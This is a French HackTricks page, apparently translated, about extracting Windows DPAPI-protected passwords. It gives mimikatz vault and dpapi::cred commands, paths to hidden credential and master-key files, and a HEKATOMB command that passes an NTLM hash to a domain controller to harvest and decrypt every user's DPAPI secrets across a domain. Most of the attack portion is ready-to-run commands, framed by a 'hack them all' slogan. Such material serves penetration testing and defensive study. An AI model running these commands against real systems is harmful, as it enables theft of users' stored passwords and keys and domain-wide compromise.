# DPAPI - Extraction des mots de passe

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert Red Team AWS de HackTricks)</strong></a><strong>!</strong></summary>

* Travaillez-vous dans une **entreprise de cybersécurité**? Vous voulez voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) est l'événement le plus pertinent en matière de cybersécurité en **Espagne** et l'un des plus importants en **Europe**. Avec pour **mission de promouvoir les connaissances techniques**, ce congrès est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybersécurité dans chaque discipline.

{% embed url="https://www.rootedcon.com/" %}

## Qu'est-ce que DPAPI

L'API de protection des données (DPAPI) est principalement utilisée dans le système d'exploitation Windows pour le **chiffrement symétrique des clés privées asymétriques**, en utilisant les secrets utilisateur ou système comme source significative d'entropie. Cette approche simplifie le chiffrement pour les développeurs en leur permettant de chiffrer des données à l'aide d'une clé dérivée des secrets de connexion de l'utilisateur ou, pour le chiffrement système, des secrets d'authentification de domaine du système, évitant ainsi aux développeurs de gérer eux-mêmes la protection de la clé de chiffrement.

### Données protégées par DPAPI

Parmi les données personnelles protégées par DPAPI, on trouve :

- Les mots de passe et les données d'auto-complétion d'Internet Explorer et de Google Chrome
- Les mots de passe des comptes de messagerie et FTP internes pour des applications comme Outlook et Windows Mail
- Les mots de passe des dossiers partagés, des ressources, des réseaux sans fil et du coffre Windows, y compris les clés de chiffrement
- Les mots de passe des connexions de bureau à distance, du passeport .NET et des clés privées à des fins diverses d'authentification et de chiffrement
- Les mots de passe des réseaux gérés par le Gestionnaire d'informations d'identification et les données personnelles dans les applications utilisant CryptProtectData, telles que Skype, MSN Messenger, et plus encore

## Liste Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Fichiers d'informations d'identification

Les **fichiers d'informations d'identification protégés** pourraient être situés dans :
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Obtenez des informations d'identification en utilisant mimikatz `dpapi::cred`, dans la réponse, vous pouvez trouver des informations intéressantes telles que les données chiffrées et le guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
Vous pouvez utiliser le module **mimikatz** `dpapi::cred` avec le `/masterkey` approprié pour décrypter :
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Clés maîtresses

Les clés DPAPI utilisées pour crypter les clés RSA de l'utilisateur sont stockées sous le répertoire `%APPDATA%\Microsoft\Protect\{SID}`, où {SID} est l'[**Identifiant de sécurité**](https://fr.wikipedia.org/wiki/Identifiant\_de\_sécurité) **de cet utilisateur**. **La clé DPAPI est stockée dans le même fichier que la clé maîtresse qui protège les clés privées des utilisateurs**. Elle est généralement composée de 64 octets de données aléatoires. (Remarquez que ce répertoire est protégé, vous ne pouvez pas le lister en utilisant `dir` depuis le cmd, mais vous pouvez le lister depuis PS).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Ceci est à quoi ressemblera un tas de clés principales d'un utilisateur :

![](<../../.gitbook/assets/image (324).png>)

Généralement, **chaque clé principale est une clé symétrique chiffrée qui peut décrypter d'autres contenus**. Par conséquent, **extraire** la **clé principale chiffrée** est intéressant pour pouvoir **décrypter** ultérieurement ce **autre contenu** chiffré avec elle.

### Extraire la clé principale et décrypter

Consultez l'article [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) pour un exemple de comment extraire la clé principale et la décrypter.


## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) est un portage en C# de certaines fonctionnalités DPAPI du projet de [@gentilkiwi](https://twitter.com/gentilkiwi) [Mimikatz](https://github.com/gentilkiwi/mimikatz/).

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) est un outil qui automatise l'extraction de tous les utilisateurs et ordinateurs du répertoire LDAP et l'extraction de la clé de sauvegarde du contrôleur de domaine via RPC. Le script résoudra ensuite toutes les adresses IP des ordinateurs et effectuera un smbclient sur tous les ordinateurs pour récupérer tous les blobs DPAPI de tous les utilisateurs et décryptera tout avec la clé de sauvegarde du domaine.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Avec la liste des ordinateurs extraite du LDAP, vous pouvez trouver chaque sous-réseau même si vous ne les connaissiez pas !

"Parce que les droits d'administrateur de domaine ne suffisent pas. Piratez-les tous."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) peut extraire automatiquement des secrets protégés par DPAPI.

## Références

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) est l'événement le plus pertinent en matière de cybersécurité en **Espagne** et l'un des plus importants en **Europe**. Avec pour **mission de promouvoir les connaissances techniques**, ce congrès est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybersécurité dans chaque discipline.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
